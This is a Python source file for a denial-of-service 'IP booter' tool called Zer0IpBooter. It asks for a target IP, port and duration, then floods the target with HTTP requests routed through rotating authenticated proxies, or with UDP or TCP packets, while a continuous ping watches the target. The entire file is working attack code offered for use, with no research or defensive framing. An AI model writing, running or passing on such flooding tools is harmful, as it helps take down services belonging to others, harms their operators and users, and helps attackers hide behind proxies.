import asyncio
import aiohttp
import random
import time
import threading
import subprocess
import socket
import logging
from aiohttp import BasicAuth

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class Zer0IpBooter:
    def __init__(self, target_ip, target_port, attack_type, duration, proxies):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_type = attack_type
        self.duration = duration
        self.proxies = proxies
        self.packet_count = 0
        self.packet_size = 1024  # packet size
        self.stop_event = threading.Event()
        self.start_time = time.time()

    async def http_flood(self):
        end_time = self.start_time + self.duration
        request_url = f"http://{self.target_ip}:{self.target_port}/"
        async with aiohttp.ClientSession() as session:
            while time.time() < end_time and not self.stop_event.is_set():
                try:
                    proxy = random.choice(self.proxies)
                    proxy_ip, proxy_port, proxy_user, proxy_pass = proxy.split(':')
                    proxy_url = f"http://{proxy_ip}:{proxy_port}"
                    proxy_auth = BasicAuth(proxy_user, proxy_pass)
                    
                    async with session.get(request_url, proxy=proxy_url, proxy_auth=proxy_auth) as response:
                        if response.status == 200:
                            self.packet_count += 1
                            logging.info(f"HTTP flood request sent via proxy {proxy} to {self.target_ip}:{self.target_port} | Packet Size: {self.packet_size} bytes")
                        else:
                            logging.warning(f"Failed HTTP flood request via proxy {proxy} | Response Status: {response.status}")
                except Exception as e:
                    logging.error(f"Error sending HTTP flood request: {e}")
                await asyncio.sleep(0.5)  # Small delay between requests

    def udp_flood(self):
        end_time = self.start_time + self.duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                message = b'\x00' * self.packet_size
                sock.sendto(message, (self.target_ip, self.target_port))
                self.packet_count += 1
                logging.info(f"UDP flood packet sent to {self.target_ip}:{self.target_port} | Packet Size: {self.packet_size} bytes")
            except Exception as e:
                logging.error(f"Error sending UDP flood packet: {e}")
            time.sleep(0.5)  # Small delay between packets
        sock.close()
        total_size_bytes = self.packet_count * self.packet_size
        total_size_gb = total_size_bytes / 1_073_741_824  # Convert bytes to GB
        logging.info(f"UDP flood attack finished. Total packets sent: {self.packet_count} | Total size: {total_size_gb:.5f} GB")

    def tcp_flood(self):
        end_time = self.start_time + self.duration
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)  # Set a timeout to prevent hanging
                sock.connect((self.target_ip, self.target_port))
                sock.send(b'\x00' * self.packet_size)
                self.packet_count += 1
                logging.info(f"TCP flood packet sent to {self.target_ip}:{self.target_port} | Packet Size: {self.packet_size} bytes")
                sock.close()
            except (socket.timeout, ConnectionRefusedError) as e:
                logging.error(f"Error sending TCP flood packet: {e}")
            except Exception as e:
                logging.error(f"Unexpected error: {e}")
            time.sleep(0.5)  # Small delay between packets
        total_size_bytes = self.packet_count * self.packet_size
        total_size_gb = total_size_bytes / 1_073_741_824  # Convert bytes to GB
        logging.info(f"TCP flood attack finished. Total packets sent: {self.packet_count} | Total size: {total_size_gb:.5f} GB")

    def start_attack(self):
        logging.info(f"Starting attack of type '{self.attack_type}'...")
        if self.attack_type == 'http':
            asyncio.run(self.http_flood())
        elif self.attack_type == 'udp':
            self.udp_flood()
        elif self.attack_type == 'tcp':
            self.tcp_flood()
        else:
            logging.error("Unsupported attack type.")
        logging.info(f"Attack finished. Total packets sent: {self.packet_count} | Packet size: {self.packet_size} bytes")

    def stop_attack(self):
        self.stop_event.set()
        logging.info("Stopping attack...")

def print_banner():
    banner = """
    ███████╗███████╗██████╗  ██████╗  ██████╗ ██╗██████╗  ██████╗  ██████╗ ███████╗██████╗ 
    ██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔════╝ ██║██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔══██╗
    ███████╗█████╗  ██████╔╝██║   ██║██║  ███╗██║██████╔╝██║   ██║██║   ██║███████╗██████╔╝
    ╚════██║██╔══╝  ██╔═══╝ ██║   ██║██║   ██║██║██╔═══╝ ██║   ██║██║   ██║╚════██║██╔═══╝ 
    ███████║███████╗██║     ╚██████╔╝╚██████╔╝██║██║     ╚██████╔╝╚██████╔╝███████║██║     
    ╚══════╝╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝╚═╝      ╚═════╝  ╚═════╝ ╚══════╝╚═╝     
    """
    print(banner)

def open_ping_window(target_ip):
    command = f'start cmd /k ping {target_ip} -t'
    subprocess.Popen(command, shell=True)

def test_connection(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((ip, port))
            logging.info(f"Connection test to {ip}:{port} succeeded.")
    except Exception as e:
        logging.error(f"Connection test to {ip}:{port} failed: {e}")

def main():
    print_banner()
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    attack_type = input("Enter attack type (http, udp, tcp): ").strip().lower()
    duration = int(input("Enter duration of attack in seconds: "))
    
    # List of proxies with authentication
    proxies = [
        "Proxy IP:Proxy Port:Proxy Username:Proxy password",
        "Proxy IP:Proxy Port:Proxy Username:Proxy password",
        "Proxy IP:Proxy Port:Proxy Username:Proxy password",
        "Proxy IP:Proxy Port:Proxy Username:Proxy password",
        "Proxy IP:Proxy Port:Proxy Username:Proxy password",
        "Proxy IP:Proxy Port:Proxy Username:Proxy password",
        "Proxy IP:Proxy Port:Proxy Username:Proxy password",
        "Proxy IP:Proxy Port:Proxy Username:Proxy password",
        "Proxy IP:Proxy Port:Proxy Username:Proxy password",
        "Proxy IP:Proxy Port:Proxy Username:Proxy password",
    ]

    # Test the connection to the target
    test_connection(target_ip, target_port)

    booter = Zer0IpBooter(target_ip, target_port, attack_type, duration, proxies)
    
    # Start the ping monitoring in a separate cmd window
    open_ping_window(target_ip)

    # Start the attack
    logging.info("Zer0IpBOOTER starting...")
    attack_thread = threading.Thread(target=booter.start_attack)
    attack_thread.start()
    
    try:
        attack_thread.join()
    except KeyboardInterrupt:
        logging.info("Attack interrupted. Stopping...")
        booter.stop_attack()
        attack_thread.join()

    # Final logging of attack results
    total_size_bytes = booter.packet_count * booter.packet_size
    total_size_gb = total_size_bytes / 1_073_741_824  # Convert bytes to GB
    logging.info(f"Total packets sent: {booter.packet_count} | Total size: {total_size_gb:.5f} GB")

if __name__ == "__main__":
    main()
